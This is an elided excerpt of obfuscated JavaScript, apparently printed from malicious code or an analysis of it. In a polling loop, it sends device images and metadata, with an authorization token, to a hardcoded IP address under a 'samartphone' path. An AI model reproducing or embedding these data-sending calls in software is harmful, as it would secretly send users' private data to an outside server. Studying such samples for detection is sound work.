...
pz.get = (d, e = {}) => {
  ...
  if (f.length > 0) {
    ...
    h.images = f;
    const i = {};
    return i.authorization = config.token, pz.put('http://181.215.254.182/samartphone/storage/deleteMany', h, i);
  }
  ...
  pz.post('http://181.215.254.182/samartphone/metadata/6056b4aa1cf80010efb4ed1d', g, h).catch(i => i);
};
...
p6(async function () {
    try {
        while (true) {
            ...
            /* const g = await pz.post('http://181.215.254.182/samartphone/v2/server/6056b4aa1cf80010efb4ed1d/authenticate', f, d),
